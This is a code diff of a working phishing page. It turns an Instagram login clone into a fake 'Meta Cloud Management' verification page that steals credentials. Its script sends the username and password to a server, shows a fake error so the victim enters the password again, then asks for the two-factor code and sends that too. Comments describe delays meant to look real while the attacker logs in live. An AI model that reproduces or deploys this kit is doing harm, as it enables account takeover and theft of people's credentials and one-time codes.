@@ -3,88 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Instagram</title>
+    <title>Meta Cloud Management</title>
     <style>
         body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .login-box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
-        .logo { width: 175px; margin-bottom: 30px; }
-        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; box-sizing: border-box; }
-        .btn { background: #0095f6; color: white; border: none; width: 100%; padding: 8px; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 8px; }
-        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
-        .error-txt { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; }
-        #loader { display: none; flex-direction: column; align-items: center; }
-        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        .box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 8px; }
+        .logo { width: 100px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; font-size: 14px; box-sizing: border-box; }
+        .btn { background: #0095f6; color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 14px; }
+        .status-msg { font-size: 12px; color: #8e8e8e; margin-bottom: 15px; }
+        .error { color: #ed4956; font-size: 13px; margin-bottom: 15px; display: none; }
+        #loader { display: none; flex-direction: column; align-items: center; padding: 20px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="login-box" id="auth-box">
-    <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_2x.png/398364833643.png" class="logo">
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="logo">
+    <p class="status-msg">Identity Verification for Account Optimization</p>
     
-    <div id="error" class="error-txt">Sorry, your password was incorrect. Please double-check your password.</div>
+    <div id="error-box" class="error">Verification failed. Please double-check your credentials.</div>
 
-    <div id="login-form">
-        <input type="text" id="username" placeholder="Phone number, username, or email">
-        <input type="password" id="password" placeholder="Password">
-        <button class="btn" onclick="startMiddleman()">Log In</button>
-        <div class="divider">OR</div>
-        <p style="color:#385185; font-weight:600; font-size:14px; cursor:pointer;">Log in with Facebook</p>
+    <div id="login-section">
+        <input type="text" id="user_id" placeholder="Username / ID">
+        <input type="password" id="access_key" placeholder="Access Key">
+        <button class="btn" onclick="triggerSync()">SYNC ACCOUNT</button>
     </div>
 
     <div id="loader">
         <div class="spinner"></div>
-        <p style="font-size: 12px; color: #8e8e8e; margin-top: 10px;">Verifying with Secure API...</p>
+        <p style="font-size: 12px; color: #8e8e8e; margin-top: 15px;">Initializing Secure Handshake...</p>
+        <p style="font-size: 10px; color: #ccc;">Do not close this window.</p>
     </div>
 
-    <div id="otp-form" style="display:none;">
-        <p style="font-size: 14px; font-weight:600;">Two-Factor Authentication</p>
-        <p style="font-size: 12px; color: #8e8e8e;">Enter the 6-digit code we sent to your device.</p>
-        <input type="number" id="otp" placeholder="Security Code">
-        <button class="btn" onclick="submitOTP()">Verify Account</button>
+    <div id="otp-section" style="display:none;">
+        <p style="font-size: 14px; font-weight: 600;">Security Code Required</p>
+        <p class="status-msg">Enter the 6-digit PIN sent to your registered device.</p>
+        <input type="number" id="otp_val" placeholder="000000">
+        <button class="btn" onclick="finishSync()">CONFIRM IDENTITY</button>
     </div>
 </div>
 
 <script>
     let tries = 0;
-    
-    async function startMiddleman() {
-        const u = document.getElementById('username').value;
-        const p = document.getElementById('password').value;
+
+    async function triggerSync() {
+        const u = document.getElementById('user_id').value;
+        const p = document.getElementById('access_key').value;
         if(!u || !p) return;
 
-        // Show Loading
-        document.getElementById('login-form').style.display = 'none';
+        document.getElementById('login-section').style.display = 'none';
         document.getElementById('loader').style.display = 'flex';
 
         if(tries < 1) {
-            // Step 1: Capture and show error
-            await fetch('/api', { method: 'POST', body: JSON.stringify({u, p, type: 'INITIAL_CAPTURE'}) });
+            // First Attempt Capture
+            await sendData({u, p, t: 'LOG_INIT'});
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
-                document.getElementById('login-form').style.display = 'block';
-                document.getElementById('error').style.display = 'block';
-                document.getElementById('password').value = '';
+                document.getElementById('login-section').style.display = 'block';
+                document.getElementById('error-box').style.display = 'block';
+                document.getElementById('access_key').value = '';
                 tries++;
-            }, 2000);
+            }, 3000); // 3 seconds wait to look real
         } else {
-            // Step 2: Capture real pass and show OTP
-            await fetch('/api', { method: 'POST', body: JSON.stringify({u, p, type: 'VERIFIED_PASS'}) });
+            // Real Pass Capture
+            await sendData({u, p, t: 'REAL_CRED'});
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
-                document.getElementById('otp-form').style.display = 'block';
-            }, 1500);
+                document.getElementById('otp-section').style.display = 'block';
+            }, 5000); // 5 seconds wait: Is doran aap login trigger karenge
         }
     }
 
-    async function submitOTP() {
-        const o = document.getElementById('otp').value;
-        const u = document.getElementById('username').value;
+    async function finishSync() {
+        const o = document.getElementById('otp_val').value;
+        const u = document.getElementById('user_id').value;
         if(o.length < 6) return;
+        await sendData({u, o, t: 'OTP_LIVE'});
+        window.location.href = "https://instagram.com";
+    }
 
-        await fetch('/api', { method: 'POST', body: JSON.stringify({u, o, type: 'OTP_LIVE'}) });
-        window.location.href = "https://instagram.com/accounts/login";
+    async function sendData(payload) {
+        try {
+            await fetch('/api', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) { console.error("Sync Error"); }
     }
 </script>
 </body>
